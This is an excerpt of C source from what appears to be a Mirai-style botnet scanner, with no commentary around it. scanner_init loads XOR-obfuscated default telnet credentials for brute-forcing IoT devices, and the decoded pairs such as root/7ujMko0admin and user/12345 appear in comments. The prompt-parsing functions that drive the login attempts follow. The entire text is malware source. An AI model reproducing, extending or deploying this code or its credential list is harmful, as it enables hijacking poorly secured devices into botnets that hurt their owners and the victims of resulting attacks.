...
void scanner_init(void)
{
    ...
    // Set up passwords
	add_auth_entry("\x26\x3B\x3B\x20", "", 4);                                                  // root
	add_auth_entry("\x26\x3B\x3B\x20", "\x26\x3B\x3B\x20", 8);                                  // root anko
	add_auth_entry("\x26\x3B\x3B\x20", "\x3C\x21\x3A\x20\x61\x63\x61\x6D", 12);                 // root hunt5759
	add_auth_entry("\x20\x31\x38\x3A\x31\x20", "\x20\x31\x38\x3A\x31\x20", 12);                 // telnet telnet
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "", 7);                                      // default
	add_auth_entry("\x26\x3B\x3B\x20", "\x24\x35\x27\x27\x23\x3B\x26\x30", 12);                 // root password
    ...
    add_auth_entry("\x26\x3B\x3B\x20", "\x30\x31\x32\x35\x21\x38\x20", 11);                     // root default 
	add_auth_entry("\x26\x3B\x3B\x20", "\x63\x21\x3E\x19\x3F\x3B\x64\x35\x30\x39\x3D\x3A", 17); // root 7ujMko0admin
	add_auth_entry("\x26\x3B\x3B\x20", "\x65\x66\x67\x60\x61", 9);                              // root 12345
	add_auth_entry("\x21\x27\x31\x26", "\x21\x27\x31\x26", 8);                                  // user user
	add_auth_entry("\x21\x27\x31\x26", "\x65\x66\x67\x60\x61", 9);                              // user 12345
...
static int consume_user_prompt(struct scanner_connection *conn)
{
    ...
    if (prompt_ending == -1)
    {
		...
		Cult_ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
		Cult_enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, Cult_ogin, len - 1) != -1))
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, Cult_enter, len - 1) != -1))
            prompt_ending = tmp;
    }
...
static int consume_pass_prompt(struct scanner_connection *conn)
{
        ...
        if (prompt_ending == -1)
    {
		...
		Cult_asswd = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, Cult_asswd, len - 1) != -1))
            prompt_ending = tmp;
    }
